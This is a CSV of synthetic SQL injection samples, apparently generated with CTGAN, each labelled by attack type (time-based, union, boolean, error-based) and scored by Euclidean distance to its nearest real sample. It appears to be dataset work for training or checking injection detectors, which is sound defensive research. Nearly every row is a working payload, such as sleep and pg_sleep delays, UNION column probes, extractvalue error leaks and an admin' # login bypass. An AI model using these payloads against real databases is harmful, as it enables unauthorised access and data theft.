CTGAN_001632,attack,time,1'   )    )    as qgyz where 1547  =  1547 and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R001414,5.9051528739550925
CTGAN_001633,attack,other,"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3",nearest_attack_euclidean,R003440,3.593532816792639
CTGAN_001634,attack,boolean,"1'   )    )    or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (   'dssx' like 'dssx",nearest_attack_euclidean,R008901,2.7319378719957705
CTGAN_001635,attack,union,"1""  )   as hymr where 5497  =  5497 union all select null,null,null,null--",nearest_attack_euclidean,R007076,1.9154335809971463
CTGAN_001636,attack,union,"-4915' union all select 1928,1928,1928,1928#",nearest_attack_euclidean,R006027,3.841983033930695
CTGAN_001637,attack,error,"-1168   )    )    as vlol where 3475  =  3475 or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",nearest_attack_euclidean,R002480,5.595020437842718
CTGAN_001638,attack,union,"-6000""  )   where 1797  =  1797 union all select 1797,1797,1797,1797,1797,1797,1797,1797--",nearest_attack_euclidean,R004240,3.2551419077549637
CTGAN_001639,attack,union,"-1823 where 6852  =  6852 union all select 6852,6852,6852,6852,6852,6852#",nearest_attack_euclidean,R004094,3.951729359807133
CTGAN_001640,attack,time,"select sleep  (  5  )   and   (  ""%""  =  """,nearest_attack_euclidean,R001838,4.8686702163893205
CTGAN_001641,attack,union,"1'   )    )    as orvy where 7270  =  7270 union all select null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R003122,7.551971574521125
CTGAN_001642,attack,boolean,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and   (  ""nwjv""  =  ""nwjv",nearest_attack_euclidean,R008343,3.7250273280234643
CTGAN_001643,attack,boolean,"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  'inec'  =  'inec",nearest_attack_euclidean,R004226,1.7749732351050258
CTGAN_001644,attack,error,"1""   )    )    or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (   ""tfso""  =  ""tfso",nearest_attack_euclidean,R007792,3.438762867329057
CTGAN_001645,attack,union,"-8325   )    )    as ajxq where 6630  =  6630 union all select 6630,6630,6630,6630,6630,6630--",nearest_attack_euclidean,R005116,4.4324067353292
CTGAN_001646,attack,time, (  7098  =  7098 and sleep  (  5   )    ) ,nearest_attack_euclidean,R005847,3.904244498079655
CTGAN_001647,attack,other,1   )    )    as svhd where 9761  =  9761,nearest_attack_euclidean,R003978,2.478069508374138
CTGAN_001648,attack,union,"-3370""  )   union all select 7845,7845,7845,7845,7845,7845#",nearest_attack_euclidean,R001522,3.787365961629537
CTGAN_001649,attack,error,"1   )    )     )   procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",nearest_attack_euclidean,R003740,4.451351738409426
CTGAN_001650,attack,other,"1""  )   as vqkz where 8536  =  8536",nearest_attack_euclidean,R004832,4.872277200103482
CTGAN_001651,attack,union,"1' where 1093  =  1093 union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R005987,5.1970731728027415
CTGAN_001652,attack,union,"1' union all select null,null,null,null,null,null#",nearest_attack_euclidean,R004242,3.9596326072655867
CTGAN_001653,attack,boolean,"1   )    )     )   or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and    (    (     (  1164  =  1164",nearest_attack_euclidean,R004115,1.9838232689186703
CTGAN_001654,attack,other,1  )   as ilqx where 8547  =  8547,nearest_attack_euclidean,R003156,1.3544350660430264
CTGAN_001655,attack,union,"-3068%""   )    )    union all select 6597,6597,6597,6597,6597,6597,6597,6597--",nearest_attack_euclidean,R006276,4.11643108544978
CTGAN_001656,attack,union,"1' in boolean mode  )   union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R003923,4.260581688311563
CTGAN_001657,attack,boolean,"-5391 or make_set  (  9354  =  9354,7185  )  # ptyy",nearest_attack_euclidean,R005757,4.286965580251746
CTGAN_001658,attack,other,1   )    )    as syot where 1199  =  1199,nearest_attack_euclidean,R005149,2.719188517011262
CTGAN_001659,attack,boolean,"1' and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   ",nearest_attack_euclidean,R005053,3.316835984694683
CTGAN_001660,attack,error,"1'||  (  select 'adiv' from dual where 9842  =  9842 and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )      )    )   ||'",nearest_attack_euclidean,R003996,7.529024208075538
CTGAN_001661,attack,boolean,"1' where 1031  =  1031 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )  --",nearest_attack_euclidean,R002095,4.501141026249411
CTGAN_001662,attack,error,1'+  (  select onzd where 8452  =  8452 and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric   )    )   +',nearest_attack_euclidean,R007942,25.411472056699814
CTGAN_001663,attack,union,"1""  )   union all select null,null--",nearest_attack_euclidean,R004851,5.911255833461887
CTGAN_001664,attack,time,1 waitfor delay '0:0:5'# opyp,nearest_attack_euclidean,R005320,3.0252310825924615
CTGAN_001665,attack,union,"1""   )    )    as isqj where 6344  =  6344 union all select null,null,null,null--",nearest_attack_euclidean,R001505,5.621902059729118
CTGAN_001666,attack,union," select * from users where id  =  1 +$ 1 union select null,@@VERSION -- 1",nearest_attack_euclidean,R000438,5.020515705131295
CTGAN_001667,attack,time,1' in boolean mode  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   #,nearest_attack_euclidean,R006315,3.7438986319397136
CTGAN_001668,attack,union,"-4318""  )   as vpvt where 5543  =  5543 union all select 5543,5543,5543,5543,5543,5543--",nearest_attack_euclidean,R004523,4.243437051290657
CTGAN_001669,attack,union,"1' union all select null,null,null--",nearest_attack_euclidean,R000893,3.155696446493025
CTGAN_001670,attack,time,select sleep  (  5  )   and 'hhrw' like 'hhrw,nearest_attack_euclidean,R007915,3.0274140073535416
CTGAN_001671,attack,time,"1"" or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R003229,4.344074239568641
CTGAN_001672,attack,time,1' in boolean mode  )   waitfor delay '0:0:5'#,nearest_attack_euclidean,R001569,3.4684492883146376
CTGAN_001673,attack,other,1  )   as ilqx where 8547  =  8547,nearest_attack_euclidean,R003156,1.3447248582469356
CTGAN_001674,attack,union," select * from users where id  =  1. union select null,version  (    )   -- 1",nearest_attack_euclidean,R000410,4.011107044589262
CTGAN_001675,attack,other,"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   #",nearest_attack_euclidean,R007040,2.4173377540251564
CTGAN_001676,attack,boolean,"1   )    )     (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and    (    (   1402  =  1402",nearest_attack_euclidean,R006861,4.241449965421917
CTGAN_001677,attack,error,"1   )    )     )   or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and    (    (     (  1782  =  1782",nearest_attack_euclidean,R002290,5.348559469172457
CTGAN_001678,attack,boolean,"1""  )   where 2136  =  2136 or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R000756,2.043688694540798
CTGAN_001679,attack,union,"1""  )   as qwyt where 4236  =  4236 union all select null,null,null,null,null--",nearest_attack_euclidean,R005473,4.611763210974412
CTGAN_001680,attack,time,"1',  (  select   (  case when   (  7734  =  7734  )   then   (  select benchmark  (  5000000,md5  (  0x72747341   )    )     )   else 7734*  (  select 7734 from mysql.db  )   end   )    )   ",nearest_attack_euclidean,R006753,8.397790899797666
CTGAN_001681,attack,time,"1'   )    )     )   and elt  (  3114  =  3114,sleep  (  5   )    )   #",nearest_attack_euclidean,R008718,4.156282404004616
CTGAN_001682,attack,boolean,"1'||  (  select 'ggfx' where 4932  =  4932 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5   )    )   ||'",nearest_attack_euclidean,R001901,5.790999882444542
CTGAN_001683,attack,union,"-4711' in boolean mode  )   union all select 8007,8007,8007,8007,8007,8007--",nearest_attack_euclidean,R003399,5.270294551281267
CTGAN_001684,attack,other,end# ckxq,nearest_attack_euclidean,R003895,3.3734463329470463
CTGAN_001685,attack,boolean,"1'   )    )    and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and    (    (   'vwtq'  =  'vwtq",nearest_attack_euclidean,R008065,4.540322716821581
CTGAN_001686,attack,boolean,-4313%'  )   or 6872  =  6872 and   (  '%'  =  ',nearest_attack_euclidean,R005776,1.9954147217955402
CTGAN_001687,attack,boolean,"-2745' or elt  (  1032  =  1032,3623  )  ",nearest_attack_euclidean,R006963,1.6579166351550056
CTGAN_001688,attack,boolean,"1'   )    )    as fjbe where 4662  =  4662 or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R005263,3.963162224279746
CTGAN_001689,attack,boolean,"1""  )   where 9295  =  9295 and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --",nearest_attack_euclidean,R006073,4.35604911625664
CTGAN_001690,attack,time,"1""   )    )    as nsbu where 6569  =  6569 or sleep  (  5  )  #",nearest_attack_euclidean,R005065,2.727215435671879
CTGAN_001691,attack,union,"1'  )   as ekjw where 5477  =  5477 union all select null,null,null,null,null--",nearest_attack_euclidean,R000701,2.3362413537980817
CTGAN_001692,attack,other,1   )    )    as mlpf where 7425  =  7425,nearest_attack_euclidean,R001024,2.666063545624972
CTGAN_001693,attack,boolean,-7279  )   or 9898  =  9963 and   (  1481  =  1481,nearest_attack_euclidean,R002855,2.4369113209058164
CTGAN_001694,attack,time,"1,  (  select   (  case when   (  1609  =  1609  )   then waitfor delay '0:0:5' else 1609*  (  select 1609 from master..sysdatabases  )   end   )    )   ",nearest_attack_euclidean,R002555,4.949728245493605
CTGAN_001695,attack,boolean,"1%"" and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and ""%""  =  """,nearest_attack_euclidean,R003107,4.579616466014983
CTGAN_001696,attack,union,"-6389"" union all select 2355,2355,2355,2355,2355--",nearest_attack_euclidean,R002110,3.579479209101249
CTGAN_001697,attack,other,%7C,nearest_attack_euclidean,R009038,7.153356563122193
CTGAN_001698,attack,other,select   (  case when   (  3773  =  3722  )   then 3773 else 3773*  (  select 3773 from mysql.db  )   end  )  #,nearest_attack_euclidean,R008482,4.085004773264869
CTGAN_001699,attack,time,"1   )    )     )   or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and    (    (     (  8671  =  8671",nearest_attack_euclidean,R002369,6.225957721085206
CTGAN_001700,attack,other,1'||  (  select 'cfff' where 4994  =  4994,nearest_attack_euclidean,R001799,2.0254821911332117
CTGAN_001701,attack,error,"1  )   and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and   (  5037  =  5037",nearest_attack_euclidean,R001680,3.4588599892193663
CTGAN_001702,attack,union,"1'  )   as ekjw where 5477  =  5477 union all select null,null,null,null,null--",nearest_attack_euclidean,R000701,4.201854634222952
CTGAN_001703,attack,union,"1%""  )   union all select null,null,null,null,null,null#",nearest_attack_euclidean,R007275,2.6865461035072267
CTGAN_001704,attack,boolean,1 and user_name  (    )     =   'dbo',nearest_attack_euclidean,R000079,3.1529426332645722
CTGAN_001705,attack,time,"1',  (  select   (  case when   (  1570  =  1570  )   then   (  select 1570 from pg_sleep  (  5   )    )    else 1/  (  select 0  )   end   )    )   ",nearest_attack_euclidean,R008435,10.252493343521957
CTGAN_001706,attack,boolean,"1'   )    )    as gqzy where 2312  =  2312 or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R007542,2.7953602183568416
CTGAN_001707,attack,union,"-8999"" where 2821  =  2821 union all select 2821,2821,2821,2821,2821,2821,2821,2821#",nearest_attack_euclidean,R008006,3.4301886912902226
CTGAN_001708,attack,other,1  )   as hggi where 6511  =  6511,nearest_attack_euclidean,R002700,1.0237665036768329
CTGAN_001709,attack,boolean," end and    (    (     (  ""zpii"" like ""zpii",nearest_attack_euclidean,R001994,3.3546055960882963
CTGAN_001710,attack,boolean,-8051  )   or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and   (  5637  =  5637,nearest_attack_euclidean,R006274,3.52260289414753
CTGAN_001711,attack,union,"-3960""   )    )    union all select 7813,7813,7813,7813,7813,7813--",nearest_attack_euclidean,R008354,5.667829460253928
CTGAN_001712,attack,time,"1""   )    )     )   and sleep  (  5  )   and    (    (     (  ""fdvc"" like ""fdvc",nearest_attack_euclidean,R005546,3.9238422681506555
CTGAN_001713,attack,union,"-3205""  )   union all select 5233,5233,5233,5233#",nearest_attack_euclidean,R006281,4.225703562400951
CTGAN_001714,attack,boolean,"1 and make_set  (  6911  =  1867,1867  )  ",nearest_attack_euclidean,R006866,2.941008557704454
CTGAN_001715,attack,boolean,"1%' and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R006362,3.3142709753540567
CTGAN_001716,attack,boolean,"1'   )    )     )   and make_set  (  8403  =  8403,8899  )   and    (    (     (  'zxon' like 'zxon",nearest_attack_euclidean,R004352,1.9402500644707985
CTGAN_001717,attack,boolean,"1'  )   where 3330  =  3330 and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R008378,2.3236207971040845
CTGAN_001718,attack,union,union select * from users where login   =   char ...,nearest_attack_euclidean,R000155,5.344988111305286
CTGAN_001719,attack,boolean,"1'  )   and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and   (  'zcey'  =  'zcey",nearest_attack_euclidean,R008492,3.7775564266698876
CTGAN_001720,attack,union,"-1868   )    )    union all select 1859,1859--",nearest_attack_euclidean,R003979,3.5185635807781934
CTGAN_001721,attack,union,"1""   )    )    as yfpl where 4820  =  4820 union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R007887,7.128499955497636
CTGAN_001722,attack,boolean,end and   (  'uxzv'  =  'uxzv,nearest_attack_euclidean,R007313,2.9528655173272007
CTGAN_001723,attack,error,"1"" procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and ""acbq"" like ""acbq",nearest_attack_euclidean,R007993,3.6265613557097702
CTGAN_001724,attack,error,1  )   as nbno where 9816  =  9816 and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )  --,nearest_attack_euclidean,R004119,4.194186481260781
CTGAN_001725,attack,union,"-4756""   )    )    union all select 6846,6846,6846,6846,6846,6846,6846#",nearest_attack_euclidean,R007646,3.216293567878709
CTGAN_001726,attack,other,select 'qqpjq'||  (  case 5118 when 5118 then 1 else 0 end  )  ||'qzvzq' from rdb$database,nearest_attack_euclidean,R004669,2.883596562368034
CTGAN_001727,attack,boolean,"1  )   or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and   (  5132  =  5132",nearest_attack_euclidean,R005402,3.485162882469671
CTGAN_001728,attack,error,"1'||  (  select 'txyy' where 6500  =  6500 procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1   )    )   ||'",nearest_attack_euclidean,R003115,3.4172445055716447
CTGAN_001729,attack,other,select   (  case when   (  9376  =  4521  )   then 1 else 9376*  (  select 9376 from master..sysdatabases  )   end  )  --,nearest_attack_euclidean,R006737,4.578534086575352
CTGAN_001730,attack,union,"-3719"" union all select 6609,6609,6609,6609#",nearest_attack_euclidean,R003500,2.2239137822865938
CTGAN_001731,attack,boolean,"1   )    )    or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (   5888  =  5888",nearest_attack_euclidean,R008073,2.5037522304658486
CTGAN_001732,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and   (  'qfsu'  =  'qfsu",nearest_attack_euclidean,R002272,2.555937522907954
CTGAN_001733,attack,error,"1'   )    )    as kfnt where 8090  =  8090 procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )  --",nearest_attack_euclidean,R007987,3.428409715544126
CTGAN_001734,attack,boolean,"1   )    )     )   and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (     (  8738  =  8738",nearest_attack_euclidean,R002000,2.7750153980389887
CTGAN_001735,attack,time,"1',  (  select   (  case when   (  7734  =  7734  )   then   (  select benchmark  (  5000000,md5  (  0x72747341   )    )     )   else 7734*  (  select 7734 from mysql.db  )   end   )    )   ",nearest_attack_euclidean,R006753,20.652128994093854
CTGAN_001736,attack,boolean,"1'   )    )    as babx where 2494  =  2494 or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R004101,2.4866935564590076
CTGAN_001737,attack,union,"1' in boolean mode  )   union all select null,null,null,null,null#",nearest_attack_euclidean,R006831,4.088335703602609
CTGAN_001738,attack,boolean,"1'   )    )     )   or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (     (  'nqam'  =  'nqam",nearest_attack_euclidean,R005695,2.5071969912366083
CTGAN_001739,attack,union,union select * from users where login   =   char ...,nearest_attack_euclidean,R000155,7.2879137209926235
CTGAN_001740,attack,time,1'   )    )     )   and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R001072,3.6384571463552837
CTGAN_001741,attack,time,1'   )    )     )   and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and    (    (     (  'ineq' like 'ineq,nearest_attack_euclidean,R002977,3.691817382957193
CTGAN_001742,attack,time,1' in boolean mode  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R002133,5.036241090769035
CTGAN_001743,attack,boolean,"1'   )    )     )   and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (     (  'owot'  =  'owot",nearest_attack_euclidean,R001364,2.8811332377166003
CTGAN_001744,attack,union,"1""  )   as xwnu where 6490  =  6490 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R005957,2.6379953484922662
CTGAN_001745,attack,error,"1',updatexml  (  2917,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  2917  =  2917,1   )    )     )  ,0x717a767a71  )  ,8295  )  ",nearest_attack_euclidean,R004158,2.949362243288486
CTGAN_001746,attack,boolean,1 and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  ) ,nearest_attack_euclidean,R007736,3.738904771023942
CTGAN_001747,attack,other,"1""   )    )    as irrz where 8730  =  8730 order by 1#",nearest_attack_euclidean,R004807,3.537333160484566
CTGAN_001748,attack,time,"select sleep  (  5  )   and   (  ""%""  =  """,nearest_attack_euclidean,R001838,3.0410990948207193
CTGAN_001749,attack,error,"1  )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )   ",nearest_attack_euclidean,R001465,2.578207135587088
CTGAN_001750,attack,time,"1"" or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #",nearest_attack_euclidean,R004936,3.721528370722365
CTGAN_001751,attack,error,"-8410"" or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and ""xhzr""  =  ""xhzr",nearest_attack_euclidean,R001383,3.9853745328790344
CTGAN_001752,attack,time,1'   )    )    and sleep  (  5  )   and    (    (   'krrr'  =  'krrr,nearest_attack_euclidean,R006082,4.111260797463837
CTGAN_001753,attack,other,"1'||  (  select 'djoe' from dual where 8063  =  8063   (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )      )    )   ||'",nearest_attack_euclidean,R007544,12.578798948633523
CTGAN_001754,attack,other,1'  )   as pudv where 2609  =  2609,nearest_attack_euclidean,R002866,1.4338437815073555
CTGAN_001755,attack,time,1'   )    )    as kdse where 6767  =  6767 rlike sleep  (  5  )  #,nearest_attack_euclidean,R001214,3.682324943516261
CTGAN_001756,attack,boolean,"-7851""   )    )    or 6872  =  6872 and    (    (   ""dvbw"" like ""dvbw",nearest_attack_euclidean,R008464,3.661598720894147
CTGAN_001757,attack,boolean,"1 where 6221  =  6221 and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R003743,1.0710500618686365
CTGAN_001758,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )  # gkkx,nearest_attack_euclidean,R005427,3.9687816287294
CTGAN_001759,attack,error,"1'||  (  select 'adiv' from dual where 9842  =  9842 and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )      )    )   ||'",nearest_attack_euclidean,R003996,4.527725699630022
CTGAN_001760,attack,error,"1'||  (  select 'adiv' from dual where 9842  =  9842 and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )      )    )   ||'",nearest_attack_euclidean,R003996,3.864025761528991
CTGAN_001761,attack,boolean,1'  )   and 2305  =  1934,nearest_attack_euclidean,R006483,1.3300882111650394
CTGAN_001762,attack,boolean,"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and   (  'ckpm'  =  'ckpm",nearest_attack_euclidean,R006160,3.6507302730542865
CTGAN_001763,attack,time,"1""   )    )     )   waitfor delay '0:0:5' and    (    (     (  ""tuhy"" like ""tuhy",nearest_attack_euclidean,R008377,3.9453762468363505
CTGAN_001764,attack,time,1'   )    )    as hzbj where 1725  =  1725 or sleep  (  5  )  #,nearest_attack_euclidean,R003853,4.045408290708527
CTGAN_001765,attack,boolean,"1'   (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )   and 'efpc' like 'efpc",nearest_attack_euclidean,R008402,2.9757861761045175
CTGAN_001766,attack,error,"1%' and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and '%'  =  '",nearest_attack_euclidean,R004361,4.204767115521701
CTGAN_001767,attack,time,1'   )    )     )   and sleep  (  5  )   and    (    (     (  'vbck' like 'vbck,nearest_attack_euclidean,R009003,3.4951838517414378
CTGAN_001768,attack,time,1  )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and   (  6824  =  6824,nearest_attack_euclidean,R003963,3.767046872008434
CTGAN_001769,attack,other,   (  select top 1,nearest_attack_euclidean,R000225,2.3421759981653922
CTGAN_001770,attack,other,1' where 7036  =  7036,nearest_attack_euclidean,R001285,2.300863256329659
CTGAN_001771,attack,other,1  )   where 2010  =  2010,nearest_attack_euclidean,R003058,1.5956501882616476
CTGAN_001772,attack,union,"-5145' where 2334  =  2334 union all select 2334,2334,2334,2334--",nearest_attack_euclidean,R006130,3.3555009973018457
CTGAN_001773,attack,other,1 where 9872  =  9872,nearest_attack_euclidean,R000894,1.226226396322189
CTGAN_001774,attack,error,"1""   )    )    as czzg where 5483  =  5483 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --",nearest_attack_euclidean,R008527,4.00012457495002
CTGAN_001775,attack,other,admin' #,nearest_attack_euclidean,R000120,3.7244492279648114
CTGAN_001776,attack,boolean,"1' in boolean mode  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   #",nearest_attack_euclidean,R003224,3.622473578282867
CTGAN_001777,attack,other,   (  select top 1,nearest_attack_euclidean,R000225,3.5007479713410152
CTGAN_001778,attack,error,"1   )    )    procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (   3102  =  3102",nearest_attack_euclidean,R007664,4.471588655284284
CTGAN_001779,attack,error,"1'+  (  select 'pvej' where 4496  =  4496 and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )      )    )   +'",nearest_attack_euclidean,R005615,5.057915402423463
CTGAN_001780,attack,boolean,"1  )   and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and   (  4959  =  4959",nearest_attack_euclidean,R003591,3.221424443126824
CTGAN_001781,attack,other,1  )   as ilqx where 8547  =  8547,nearest_attack_euclidean,R003156,1.3055620071697192
